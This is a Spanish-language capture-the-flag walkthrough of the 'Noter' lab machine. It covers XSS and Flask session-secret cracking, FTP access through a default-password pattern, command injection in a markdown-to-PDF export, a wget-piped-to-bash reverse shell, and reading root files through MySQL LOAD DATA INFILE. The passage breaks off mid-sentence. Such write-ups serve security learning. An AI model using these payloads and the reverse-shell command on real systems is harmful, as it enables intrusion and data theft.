f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519) 5000/tcp open http Werkzeug httpd 2.0.2 (Python 3.8.10) |_http-title: Noter Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon May 9 21:36:17 2022 -- 1 IP address (1 host up) scanned in 11.40 seconds Web Site Los headers del sitio muestran Werkzeug en su version 2.0.2.\n1 2 3 4 5 6 7 8 π ~/htb/noter ❯ curl -sI 10.10.11.160:5000 HTTP/1.0 200 OK Content-Type: text/html; charset=utf-8 Content-Length: 1972 Server: Werkzeug/2.0.2 Python/3.8.10 Date: Tue, 10 May 2022 01:36:39 GMT π ~/htb/noter ❯ El sitio web describe que es una aplicación para tomar Notas.\nDirectory Brute Forcing feroxbuster muestra multiples direcciones, dos de ellas para registro y login.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 π ~/htb/search ❯ feroxbuster -u http://10.10.11.160:5000/ -w $MD --depth 1 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.5.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.11.160:5000/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.5.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 1 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 200 GET 67l 106w 1963c http://10.10.11.160:5000/login 200 GET 95l 152w 2642c http://10.10.11.160:5000/register 302 GET 4l 24w 218c http://10.10.11.160:5000/notes =\u0026gt; http://10.10.11.160:5000/login 302 GET 4l 24w 218c http://10.10.11.160:5000/logout =\u0026gt; http://10.10.11.160:5000/login 302 GET 4l 24w 218c http://10.10.11.160:5000/dashboard =\u0026gt; http://10.10.11.160:5000/login [####################] - 43s 4613/4613 0s found:5 errors:0 [####################] - 43s 4613/4613 107/s http://10.10.11.160:5000/ π ~/htb/search ❯ Noter Tras registrar un usuario en la aplicación vemos dos opciones, agregar nota y actualizar a VIP. Además se muestra una tabla para las notas.\nAgregamos una nota la cual podemos eliminar y editar.\nTambien se muestra la nota en /notes.\nXSS Tras intentar diferentes vulnerabilidades, encontramos una vulnerabilidad XSS. Observamos que el contenido es mostrado dentro de un \u0026lt;textarea\u0026gt;\u0026lt;/textarea\u0026gt;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;h1\u0026gt;Title\u0026lt;/h1\u0026gt; \u0026lt;small\u0026gt;Written by user on Sat May 14 03:50:40 2022\u0026lt;/small\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;div\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; textarea { border: none; outline: none; } \u0026lt;/style\u0026gt; \u0026lt;textarea class=\u0026#34;body\u0026#34; rows=\u0026#34;30\u0026#34; cols=\u0026#34;180\u0026#34; readonly\u0026gt; Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum. \u0026lt;/textarea\u0026gt; \u0026lt;/div\u0026gt; Editamos el cuerpo de la nota donde cerramos el textarea para luego agregar un alert.\n1 2 3 4 \u0026lt;/textarea\u0026gt; \u0026lt;script\u0026gt; alert(\u0026#39;XSS\u0026#39;) \u0026lt;/script\u0026gt; Tras visitar la nota se muestra la alerta. Sin embargo el XSS no nos llevo a ninguna parte.\nWeb User - Blue Cookie Vemos que la cookie es un token JWT donde observamos el nombre del usuario.\nTambien, tras realizar logout vemos que la cookie cambia y se muestra flashes con el tipo de mensaje (success) y el mensaje. Al estar corriendo Werkzeug podriamos decir que es una aplicación Flask o Django.\nFlask Unsign HackTricks sugiere la herramienta Flask-Unsign para modificar, craftear o realizar ataque de fuerza bruta y encontrar la Secret KEY para la \u0026ldquo;session\u0026rdquo; de Flask.\nInstalamos flask-unsign utilizando pip.\n1 pip3 install flask-unsign Con el wordlist rockyou logramos encontrar la secret key: secret123.\n1 2 3 4 5 6 π ~/htb/noter ❯ python3 -m flask_unsign --unsign --cookie \u0026#39;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidXNlciJ9.YnnysQ.O-aueBDiwkw5_52IE3KkT18vgxQ\u0026#39; --wordlist $ROCK --no-literal-eval [*] Session decodes to: {\u0026#39;logged_in\u0026#39;: True, \u0026#39;username\u0026#39;: \u0026#39;user\u0026#39;} [*] Starting brute-forcer with 8 threads.. [+] Found secret key after 17152 attempts b\u0026#39;secret123\u0026#39; π ~/htb/noter ❯ Enum Users Con la secret key encontrada podemos craftear una session utilizando la misma estructura de la session decodificada, sin embargo no tenemos algun nombre de usuario con el cual autenticarnos. Para ello creamos un script python que utiliza flask_unsign para enumerar nombres de usuario utilizando una session.\nTras ejecutar el script con el wordlist de SecList - Usernames encontramos al usuario \u0026lsquo;blue\u0026rsquo;.\n1 2 3 4 5 π ~/htb/noter ❯ python brute_user.py ../search/xato-net-10-million-usernames.txt [+] Progress: Found User -\u0026gt; blue [*] Cookie -\u0026gt; {\u0026#39;session\u0026#39;: \u0026#39;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yn8gig.CedZfYO0S_ctqlesN_YncNPb_aM\u0026#39;} π ~/htb/noter ❯ Web Access Tras reemplazar la cookie, vemos dos opciones nuevas para Exportar e Importar Notas.\nObservamos una nueva Nota donde menciona que tenemos acceso por FTP con las credenciales que se mencionan (blue : blue@Noter!), además vemos el nombre de usuario ftp_admin.\nFTP Access FTP - Blue Tras ingresar con las credenciales por FTP encontramos un archivo PDF.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 π ~/htb/noter ❯ ftp ftp\u0026gt; o 10.10.11.160 Connected to 10.10.11.160. 220 (vsFTPd 3.0.3) Name (10.10.11.160:kali): blue 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||36129|) 150 Here comes the directory listing. drwxr-xr-x 2 1002 1002 4096 May 02 23:05 files -rw-r--r-- 1 1002 1002 12569 Dec 24 20:59 policy.pdf 226 Directory send OK. ftp\u0026gt; cd files l250 Directory successfully changed. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||51983|) 150 Here comes the directory listing. 226 Directory send OK. ftp\u0026gt; cd .. 250 Directory successfully changed. ftp\u0026gt; get policy.pdf local: policy.pdf remote: policy.pdf 229 Entering Extended Passive Mode (|||30237|) 150 Opening BINARY mode data connection for policy.pdf (12569 bytes). 100% |*********************************************************************************************************************************************| 12569 828.90 KiB/s 00:00 ETA 226 Transfer complete. 12569 bytes received in 00:00 (83.52 KiB/s) ftp\u0026gt; exit 221 Goodbye. π ~/htb/noter ❯ file policy.pdf policy.pdf: PDF document, version 1.4, 0 pages π ~/htb/noter ❯ El archivo PDF contiene la politica de contraseñas; protección, antigüedad y creación de estas.\nEn una de las definiciones encontramos que por default las contraseñas lleva el nombre del usuario y el nombre del sitio. En este caso tendríamos el caso del usuario blue que tiene la contraseña blue@Noter!, donde blue es el usuario y Noter el nombre del sitio web.\n1 Default user-password generated by the application is in the format of \u0026#34;username@site_name!\u0026#34; (This applies to all your applications) FTP - ftp_admin Si realizamos esto mismo con el usuario ftp_admin tendriamos las siguientes credenciales.\n1 ftp_admin : ftp_admin@Noter! Logramos ingresar por ftp con las credenciales. Encontramos dos archivos zip que tienen nombre de backup.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 π ~/htb/noter ❯ ftp ftp\u0026gt; o 10.10.11.160 Connected to 10.10.11.160. 220 (vsFTPd 3.0.3) Name (10.10.11.160:kali): ftp_admin 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 229 Entering Extended Passive Mode (|||64224|) 150 Here comes the directory listing. drwxr-xr-x 2 0 1003 4096 May 02 23:05 . drwxr-xr-x 2 0 1003 4096 May 02 23:05 .. -rw-r--r-- 1 1003 1003 25559 Nov 01 2021 app_backup_1635803546.zip -rw-r--r-- 1 1003 1003 26298 Dec 01 05:52 app_backup_1638395546.zip 226 Directory send OK. ftp\u0026gt; pwd Remote directory: / ftp\u0026gt; get app_backup_1635803546.zip local: app_backup_1635803546.zip remote: app_backup_1635803546.zip 229 Entering Extended Passive Mode (|||36436|) 150 Opening BINARY mode data connection for app_backup_1635803546.zip (25559 bytes). 100% |***********************************************| 25559 48.27 KiB/s 00:00 ETA 226 Transfer complete. 25559 bytes received in 00:00 (27.81 KiB/s) ftp\u0026gt; get app_backup_1638395546.zip local: app_backup_1638395546.zip remote: app_backup_1638395546.zip 229 Entering Extended Passive Mode (|||56174|) 150 Opening BINARY mode data connection for app_backup_1638395546.zip (26298 bytes). 100% |***********************************************************************************************************************************************| 26298 228.62 KiB/s 00:00 ETA 226 Transfer complete. 26298 bytes received in 00:00 (68.21 KiB/s) ftp\u0026gt; User - svc Source Code - Noter Tras extraer ambos archivos en carpetas separadas y ejecutar diff, encontramos una diferencia en las credenciales de MySQL, observamos la contraseña para el usuario root de MySQL. Además se muestran las rutas para exportar e importar notas, local y externamente.\n1 2 3 4 5 6 7 8 π ~/htb/noter/ftp ❯ diff app_backup_1635803546 app_backup_1638395546 diff --color app_backup_1635803546/app.py app_backup_1638395546/app.py 17,18c17,18 \u0026lt; app.config[\u0026#39;MYSQL_USER\u0026#39;] = \u0026#39;root\u0026#39; \u0026lt; app.config[\u0026#39;MYSQL_PASSWORD\u0026#39;] = \u0026#39;Nildogg36\u0026#39; --- \u0026gt; app.config[\u0026#39;MYSQL_USER\u0026#39;] = \u0026#39;DB_user\u0026#39; \u0026gt; app.config[\u0026#39;MYSQL_PASSWORD\u0026#39;] = \u0026#39;DB_password\u0026#39; Command Injection Iniciamos analizando la más reciente versión del codigo fuente, donde vemos la ruta export_note, unicamente pueden acceder los usuarios con el rol VIP. Se muestran las notas de cada usuario en el template export_note.html.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 # Export notes @app.route(\u0026#39;/export_note\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) @is_logged_in def export_note(): if check_VIP(session[\u0026#39;username\u0026#39;]): try: cur = mysql.connection.cursor() # Get note result = cur.execute(\u0026#34;SELECT * FROM notes WHERE author = %s\u0026#34;, ([session[\u0026#39;username\u0026#39;]])) notes = cur.fetchall() if result \u0026gt; 0: return render_template(\u0026#39;export_note.html\u0026#39;, notes=notes) else: msg = \u0026#39;No notes Found\u0026#39; return render_template(\u0026#39;export_note.html\u0026#39;, msg=msg) # Close connection cur.close() except Exception as e: return render_template(\u0026#39;export_note.html\u0026#39;, error=\u0026#34;An error occured!\u0026#34;) else: abort(403) Vemos que dicho template tiene distintas opciones, exportar la nota localmente a PDF y exportar remotamente.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 {% extends \u0026#39;layout.html\u0026#39; %} {% block body %} \u0026lt;h1\u0026gt;Export Notes\u0026lt;/h1\u0026gt; \u0026lt;h3\u0026gt;Export an existing Note\u0026lt;/h3\u0026gt;\u0026lt;br\u0026gt; \u0026lt;ul class=\u0026#34;list-group\u0026#34;\u0026gt; {% for note in notes %} \u0026lt;li class=\u0026#34;list-group-item\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;note/{{note.id}}\u0026#34;\u0026gt;{{note.title}}\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;a class=\u0026#34;btn btn-success\u0026#34; href=\u0026#34;/export_note_local/{{note.id}}\u0026#34;\u0026gt; Export to PDF\u0026lt;/a\u0026gt; {% endfor %} \u0026lt;/ul\u0026gt; \u0026lt;hr style=\u0026#34;background-color: #000000; height: 2px; width: 100%;\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Export directly from cloud\u0026lt;/h3\u0026gt;\u0026lt;br\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;form action=\u0026#39;/export_note_remote\u0026#39; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;label\u0026gt;URL\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;url\u0026#34; class=\u0026#34;form-control\u0026#34; value={{request.form.url}}\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-success\u0026#34;\u0026gt;Export\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;br\u0026gt; \u0026lt;br\u0026gt; {% endblock %} Vemos en la ruta para exportar localmente que acepta un id que es utilizado para obtener la nota de la base de datos y, utilizando el cuerpo de la nota como argumento se lo pasa a md-to-pdf.js junto con un numero random, esto crearía un comando que luego es ejecutado, y el archivo PDF es retornado al usuario.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # Export local @app.route(\u0026#39;/export_note_local/\u0026lt;string:id\u0026gt;\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) @is_logged_in def export_note_local(id): if check_VIP(session[\u0026#39;username\u0026#39;]): cur = mysql.connection.cursor() result = cur.execute(\u0026#34;SELECT * FROM notes WHERE id = %s and author = %s\u0026#34;, (id,session[\u0026#39;username\u0026#39;])) if result \u0026gt; 0: note = cur.fetchone() rand_int = random.randint(1,10000) command = f\u0026#34;node misc/md-to-pdf.js $\u0026#39;{note[\u0026#39;body\u0026#39;]}\u0026#39; {rand_int}\u0026#34; subprocess.run(command, shell=True, executable=\u0026#34;/bin/bash\u0026#34;) return send_file(attachment_dir + str(rand_int) +\u0026#39;.pdf\u0026#39;, as_attachment=True) else: return render_template(\u0026#39;dashboard.html\u0026#39;) else: abort(403) Sin embargo tras intentar exportar localmente una nota el servidor nos muestra un error interno.\nEn la ruta para exportar remotamente encontramos una función que verifica que la url sea válida y que termine con la extensión .md. En el caso aceptado toma el cuerpo de la solicitud como argumento y crea un comando que luego es ejecutado al igual que la anterior ruta, seguidamente retorna el PDF.\nparse_url(url)\r1 2 3 4 5 6 7 8 9 10 # parse the URL def parse_url(url): url = url.lower() if not url.startswith (\u0026#34;http://\u0026#34; or \u0026#34;https://\u0026#34;): return False, \u0026#34;Invalid URL\u0026#34; if not url.endswith(\u0026#39;.md\u0026#39;): return False, \u0026#34;Invalid file type\u0026#34; return True, None 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 # Export remote @app.route(\u0026#39;/export_note_remote\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) @is_logged_in def export_note_remote(): if check_VIP(session[\u0026#39;username\u0026#39;]): try: url = request.form[\u0026#39;url\u0026#39;] status, error = parse_url(url) if (status is True) and (error is None): try: r = pyrequest.get(url,allow_redirects=True) rand_int = random.randint(1,10000) command = f\u0026#34;node misc/md-to-pdf.js $\u0026#39;{r.text.strip()}\u0026#39; {rand_int}\u0026#34; subprocess.run(command, shell=True, executable=\u0026#34;/bin/bash\u0026#34;) if os.path.isfile(attachment_dir + f\u0026#39;{str(rand_int)}.pdf\u0026#39;): return send_file(attachment_dir + f\u0026#39;{str(rand_int)}.pdf\u0026#39;, as_attachment=True) else: return render_template(\u0026#39;export_note.html\u0026#39;, error=\u0026#34;Error occured while exporting the !\u0026#34;) except Exception as e: return render_template(\u0026#39;export_note.html\u0026#39;, error=\u0026#34;Error occured!\u0026#34;) else: return render_template(\u0026#39;export_note.html\u0026#39;, error=f\u0026#34;Error occured while exporting ! ({error})\u0026#34;) except Exception as e: return render_template(\u0026#39;export_note.html\u0026#39;, error=f\u0026#34;Error occured while exporting ! ({e})\u0026#34;) else: abort(403) Si observamos más de cerca es posible realizar un \u0026ldquo;bypass\u0026rdquo; e inyectar commandos.\n1 2 command = f\u0026#34;node misc/md-to-pdf.js $\u0026#39;{r.text.strip()}\u0026#39; {rand_int}\u0026#34; subprocess.run(command, shell=True, executable=\u0026#34;/bin/bash\u0026#34;) Si revisamos el archivo .js vemos que no tiene ningun tipo de filtro.\n1 2 3 4 5 const { mdToPdf } = require(\u0026#39;md-to-pdf\u0026#39;); (async () =\u0026gt; { await mdToPdf({ content: process.argv[2] }, { dest: \u0026#39;./misc/attachments/\u0026#39; + process.argv[3] + \u0026#39;.pdf\u0026#39;}); })(); En este caso tendriamos un cuerpo de nuestra solicitud como '| id # y el comando que sería ejecutado estaría de la siguiente forma.\n1 node misc/md-to-pdf.js $\u0026#39;\u0026#39;|id # \u0026#39; 12348987 Creamos un archivo .md con el \u0026lsquo;bypass\u0026rsquo; para ejecutar un ping a nuestra máquina.\n1 2 3 π ~/htb/noter/www ❯ cat note0.md \u0026#39;| ping -c 2 10.10.14.207 # π ~/htb/noter/www ❯ Enviamos la dirección url con la nota y obtuvimos una solicitud por parte de la máquina.\n1 2 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.11.160 - - [15/May/2022 23:20:02] \u0026#34;GET /note0.md HTTP/1.1\u0026#34; 200 - En otra consola obtuvimos multiples pings.\n1 2 3 4 5 6 7 π ~/htb/noter ❯ sudo tcpdump -i tun1 icmp tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun1, link-type RAW (Raw IP), snapshot length 262144 bytes 23:21:49.179615 IP 10.10.11.160 \u0026gt; 10.10.14.207: ICMP echo request, id 3, seq 1, length 64 23:21:49.179632 IP 10.10.14.207 \u0026gt; 10.10.11.160: ICMP echo reply, id 3, seq 1, length 64 23:21:50.186280 IP 10.10.11.160 \u0026gt; 10.10.14.207: ICMP echo request, id 3, seq 2, length 64 23:21:50.186341 IP 10.10.14.207 \u0026gt; 10.10.11.160: ICMP echo reply, id 3, seq 2, length 64 Shell Ejecutamos shells en el puerto 8080 (config/default.json) y creamos una solicitud con wget para ejecutar una shell inversa.\n1 \u0026#39;| wget -qO- 10.10.14.207:8080/10.10.14.207:1338 | bash # Tras enviar la url logramos obtener una shell como svc y obtener la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 π ~/htb/noter ❯ rlwrap nc -lvp 1338 listening on [any] 1338 ... connect to [10.10.14.207] from 10.10.11.160 [10.10.11.160] 47198 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ which python /usr/bin/python $ python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; svc@noter:~/app/web$ whoami;id;pwd svc uid=1001(svc) gid=1001(svc) groups=1001(svc) /home/svc/app/web svc@noter:~/app/web$ ls app temp user.txt svc@noter:~/app/web$ cat user.txt 9ee715a75a4810327bca2bad9f18dc97 svc@noter:~/app/web$ Privesc Tras enumerar los archivos de la máquina encontramos backup.sh el cual realiza un backup de la carpeta /app/web o Noter, aunque segun parece el directorio donde es guardado no existe, además no tenemos permisos de escritura dentro de esta carpeta (/app/web).\n1 2 3 4 5 6 7 8 9 10 11 12 13 svc@noter:/opt$ ls backup.sh svc@noter:/opt$ ls -lah backup.sh -rwxr--r-- 1 root root 137 Dec 30 09:41 backup.sh svc@noter:/opt$ cat backup.sh #!/bin/bash zip -r `echo /home/svc/ftp/admin/app_backup_$(date +%s).zip` /home/svc/app/web/* -x /home/svc/app/web/misc/node_modules/**\\* svc@noter:/opt$ cd svc@noter:~$ ls ftp/admin/ ls: cannot access \u0026#39;ftp/admin/\u0026#39;: No such file or directory svc@noter:~$ ls -ld app/web/ drwxr-xr-x 4 root root 4096 May 2 23:05 app/web/ svc@noter:~$ Observamos que el puerto 3306 de MySQL está abierto.\n1 2 3 4 5 6 7 8 9 10 svc@noter:~/app/web$ netstat -ntpl Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:5000 0.0.0.0:* LISTEN 1266/python3 tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::21 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - svc@noter:~/app/web$ Read The Flag Tras autenticarnos en MySQL con las credenciales encontradas, vemos que el usuario actual es root, si tomamos en cuenta que el usuario root de la máquina está ejecutando MySQL podríamos leer archivos por este medio.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 svc@noter:~$ mysql -u root -p # Nildogg36 Password: Nildogg36 Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 7015 Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. MariaDB [(none)]\u0026gt; STATUS; -------------- mysql Ver 15.1 Distrib 10.3.32-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2 Connection id: 7063 Current database: Current user: root@localhost SSL: Not in use Current pager: stdout Using outfile: \u0026#39;\u0026#39; Using delimiter: ; Server: MariaDB Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04 Protocol version: 10 Connection: Localhost via UNIX socket Server characterset: utf8mb4 Db characterset: utf8mb4 Client characterset: utf8mb4 Conn. characterset: utf8mb4 UNIX socket: /var/run/mysqld/mysqld.sock Uptime: 2 hours 31 min 17 sec Threads: 10 Questions: 37514 Slow queries: 0 Opens: 1231 Flush tables: 1 Open tables: 8 Queries per second avg: 4.132 -------------- MariaDB [(none)]\u0026gt; Observamos las bases de datos vemos la base de datos test.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 MariaDB [(none)]\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | app | | information_schema | | mysql | | performance_schema | | test | +--------------------+ 5 rows in set (0.001 sec) MariaDB [(none)]\u0026gt; use test; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MariaDB [test]\u0026gt; Creamos una tabla para almacenar archivos e insertamos la información de /etc/passwd, vemos que se agrego a la tabla.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 MariaDB [test]\u0026gt; CREATE TABLE test ( file blob); Query OK, 0 rows affected (0.005 sec) MariaDB [test]\u0026gt; CREATE TABLE test ( file blob); MariaDB [test]\u0026gt; load data infile \u0026#34;/etc/passwd\u0026#34; into table test FIELDS TERMINATED BY \u0026#39;\\n\u0026#39;; Query OK, 38 rows affected (0.004 sec) Records: 38 Deleted: 0 Skipped: 0 Warnings: 0 MariaDB [test]\u0026gt; select * from test; +-------------------------------------------------------------------------------------------+ | file | +-------------------------------------------------------------------------------------------+ | root:x:0:0:root:/root:/bin/bash | | daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin | | bin:x:2:2:bin:/bin:/usr/sbin/nologin | | sys:x:3:3:sys:/dev:/usr/sbin/nologin | | sync:x:4:65534:sync:/bin:/bin/sync | | games:x:5:60:games:/usr/games:/usr/sbin/nologin | | man:x:6:12:man:/var/cache/man:/usr/sbin/nologin | | lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin | | mail:x:8:8:mail:/var/mail:/usr/sbin/nologin | | news:x:9:9:news:/var/spool/news:/usr/sbin/nologin | | uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin | | proxy:x:13:13:proxy:/bin:/usr/sbin/nologin | | www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin | | backup:x:34:34:backup:/var/backups:/usr/sbin/nologin | | list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin | | irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin | | gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin | | nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin | | systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin | | systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin | | systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin | | messagebus:x:103:106::/nonexistent:/usr/sbin/nologin | | syslog:x:104:110::/home/syslog:/usr/sbin/nologin | | _apt:x:105:65534::/nonexistent:/usr/sbin/nologin | | tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false | | uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin | | tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin | | landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin | | pollinate:x:110:1::/var/cache/pollinate:/bin/false | | usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin | | sshd:x:112:65534::/run/sshd:/usr/sbin/nologin | | systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin | | lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false | | svc:x:1001:1001:,,,:/home/svc:/bin/bash | | ftp:x:113:118:ftp daemon,,,:/home/svc/ftp/:/usr/sbin/nologin | | mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false | | ftp_admin:x:1003:1003::/srv/ftp/ftp_admin:/sbin/nologin | | blue:x:1002:1002::/srv/ftp/blue:/sbin/nologin | +-------------------------------------------------------------------------------------------+ 38 rows in set (0.001 sec) MariaDB [test]\u0026gt; Realizamos lo mismo para la flag root.txt, sabiendo su ruta logramos obtener su contenido.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 MariaDB [test]\u0026gt; load data infile \u0026#34;/root/root.txt\u0026#34; into table test FIELDS TERMINATED BY \u0026#39;\\n\u0026#39;; Query OK, 1 row affected (0.002 sec) Records: 1 Deleted: 0 Skipped: 0 Warnings: 0 MariaDB [test]\u0026gt; select * from test; +-------------------------------------------------------------------------------------------+ | file | +-------------------------------------------------------------------------------------------+ | root:x:0:0:root:/root:/bin/bash | | daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin | [.. snip ..] | blue:x:1002:1002::/srv/ftp/blue:/sbin/nologin | | 35f7b82498ba82872f11ad7e3b5c114f | \u0026lt;\u0026lt;\u0026lt;\u0026lt;----- +-------------------------------------------------------------------------------------------+ 39 rows in set (0.001 sec) MariaDB [test]\u0026gt; Intentamos crear el archivo authorized_keys con nuestra clave publica pero no fue posible, al parecer dicho archivo ya existe.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 svc@noter:~$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/home/svc/.ssh/id_rsa): Created directory \u0026#39;/home/svc/.ssh\u0026#39;. Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/svc/.ssh/id_rsa Your public key has been saved in /home/svc/.ssh/id_rsa.pub The key fingerprint is: SHA256:UsTo71zvGuDhl8X6Jp3lFAtpYoGRHW02niSC3cpIRIY svc@noter The key\u0026#39;s randomart image is: +---[RSA 3072]----+ | ++=o*.o | | E.+.* = * | | o o.o B + | | o.o o.* . | | ..S. oo. o | | +.o.+ + | | oo.=o = | | o..o= . | | .=o | +----[SHA256]-----+ svc@noter:~$ cat .ssh/id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/kmriBBdSTD8rd7ZWhQ/7gedJ+kCyBPyLcfLCukSwh6fXpvo4greAH02kZ4/jsfN87n39lKfLvHEcYmhTfuVyWApNYwMh4amPO7ej5MKo/P23ltpXSXwh8VSSxTA411Xxkd8jqwTX69QD0Y28vtNsDNU0vcnJQWB+OBhJWdui4b8nvIYuwuLi2pEhEdm1KUB2nLEI4KCtc/Kp8yZtxCV8605jJLQ2GtA88zC9TpovVIezXQy1rjwArgQaFbaV54orZOAklBbHJwm7DmozDZEFS/b5xI+8ydLLYHLPcYxgrU/anqtv7MudygBQ4TK8jCt4oQy/P7SbmYOkKaVbvPaZk0i8CquZ1ZNQzHH9/khAzUNfSBKSxVxBuouDUhQ6D0qWI7O9Ze/k072BqDexcJWnB9Vb4/hRACoiiThvYODLqfgkP5wkVjm6zDUvpygObsya9BJwIU/98lZJUvoakLedEZWjrPILZYuprMkJzvwq+Ld3mNwkkgX7OdUWi47m60E= svc@noter svc@noter:~$ Al parecer por seguridad mysql no permite escribir dentro de archivos 